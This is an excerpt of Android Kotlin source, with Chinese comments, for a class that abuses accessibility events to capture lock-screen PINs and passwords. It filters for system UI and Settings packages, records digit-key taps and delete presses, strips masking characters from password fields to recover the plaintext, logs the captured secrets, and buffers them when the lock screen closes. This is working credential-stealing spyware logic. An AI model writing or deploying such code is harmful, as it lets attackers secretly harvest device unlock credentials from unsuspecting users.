...
class CipherCaptureManager(
    ...
    /**
     * 核心无障碍事件处理器。
     * vendor: d6 — monitorSystemPasswordInput (485 行)
     *
     * 处理来自锁屏界面的无障碍事件:
     * - TYPE_VIEW_CLICKED (1): 检测数字键按钮点击
     * - TYPE_VIEW_TEXT_CHANGED (16): 检测密码输入框文本变化
     * - TYPE_VIEW_FOCUSED (8): 触发 overlay watcher
     * - TYPE_VIEW_HOVER_ENTER (128): 混合密码追加
     * - TYPE_WINDOW_STATE_CHANGED (32): 窗口切换检测
     * - TYPE_WINDOW_CONTENT_CHANGED (2048) / TYPE_WINDOWS_CHANGED (4194304): 定时检测
     */
    fun monitorSystemPasswordInput(event: AccessibilityEvent) {
        if (!isListening) return
        val pkg = event.packageName?.toString() ?: return

        // 包名过滤
        val validPkgs = listOf(
            "com.android.systemui", "com.hihonor.android.systemui",
            "com.android.settings", "com.hihonor.android.settings",
            "com.samsung.android.biometrics.app.setting"
        )
        if (!validPkgs.any { pkg == it }) return
        ...
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                // 数字键点击检测
                handleClickEvent(event, pkg, className)
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                // 密码输入框文本变化
                handleTextChangedEvent(event, pkg, className)
            }
            ...
            AccessibilityEvent.TYPE_WINDOWS_CHANGED -> {
                ...
                if (isListening) {
                    ...
                    try { root?.recycle() } catch (_: Exception) {}
                    Log.d(TAG, "🔷 [窗口检测] eventPkg=$pkg, actualPkg=$actualPkg")

                    if (!validPkgs.any { actualPkg == it || actualPkg.contains(it) }) {
                        val now = System.currentTimeMillis()
                        if (now - lastCheckTime < checkInterval) return
                        lastCheckTime = now

                        val hasText = collectedEvents.isNotEmpty() || pinDigits.isNotEmpty() || passwordChars.isNotEmpty()
                        val hasPending = pendingCipher != null
                        Log.d(TAG, "🔷 [窗口切换] 非密码包名: $actualPkg, hasText=$hasText, hasPending=$hasPending")

                        if (!hasText && !hasPending) {
                            Log.d(TAG, "🔷 密码界面已消失（无数据），通知重新弹出")
                            handler.post { notifyPasswordPageDismissed() }
                        } else {
                            Log.d(TAG, "🔷 密码界面已消失（有数据），保存密码并关闭监听模式")
                            if (pendingCipher == null && pinDigits.isNotEmpty()) {
                                val text = pinDigits.joinToString("")
                                val type = if (hasAlpha) "password" else "pin"
                                bufferCipher(text, type)
                            }
     ...
     * 处理点击事件 — 检测数字键点击。
     */
    private fun handleClickEvent(event: AccessibilityEvent, pkg: String, className: String) {
        try {
            ...
            // 检查是否是数字键
            val isDigitKey = (text.length == 1 && Character.isDigit(text[0])) ||
                (desc.length == 1 && Character.isDigit(desc[0])) ||
                (viewId.contains(":id/key") && viewId.lastOrNull()?.let { Character.isDigit(it) } == true)

            val isDeleteKey = viewId.contains("delete", ignoreCase = true) ||
                desc.contains("删除") || desc.equals("delete", ignoreCase = true)

            if (isDigitKey) {
                val digit = when {
                    text.length == 1 && Character.isDigit(text[0]) -> text
                    desc.length == 1 && Character.isDigit(desc[0]) -> desc
                    else -> viewId.lastOrNull()?.toString() ?: ""
                }
                pinDigits.add(digit)
                lastEventTime = System.currentTimeMillis()
                Log.d(TAG, "🔢 数字键点击: $digit (当前=${pinDigits.joinToString("")})")
            } else if (isDeleteKey && pinDigits.isNotEmpty()) {
                pinDigits.removeAt(pinDigits.size - 1)
                Log.d(TAG, "🔙 退格: 剩余=${pinDigits.joinToString("")}")
            }

            try { source.recycle() } catch (_: Exception) {}
        } catch (e: Exception) {
            Log.d(TAG, "handleClickEvent error: ${e.message}")
        }
    }
     ...
     * 处理文本变化事件。
     */
    private fun handleTextChangedEvent(event: AccessibilityEvent, pkg: String, className: String) {
        ...
        try {
            ...
            if (source != null && !source.isPassword) {
                ...
                val hasMask = eventText.contains("•") || eventText.contains("●") ||
                    eventText.contains("⬤") || eventText.contains("◉") || eventText.contains("*")
                if (!hasMask && eventText.isNotEmpty()) {
                    Log.d(TAG, "⏭️ 跳过非密码EditText: isPassword=false")
                    try { source.recycle() } catch (_: Exception) {}
                    return
                }
            }
            ...
            if (eventText.isNotEmpty()) {
                passwordChars.clear()
                // 去除遮蔽符，保留实际字符
                val cleaned = eventText.replace(Regex("[•●⬤◉﹒＊*]"), "")
                for (ch in cleaned) {
                    passwordChars.add(ch.toString())
                    if (ch.isLetter()) hasAlpha = true
                }
                lastEventTime = System.currentTimeMillis()
                Log.d(TAG, "🔤 文本变化: ${passwordChars.joinToString("")} (len=${passwordChars.size})")
            }
        } catch (e: Exception) {
            Log.d(TAG, "handleTextChangedEvent error: ${e.message}")
        }
    }
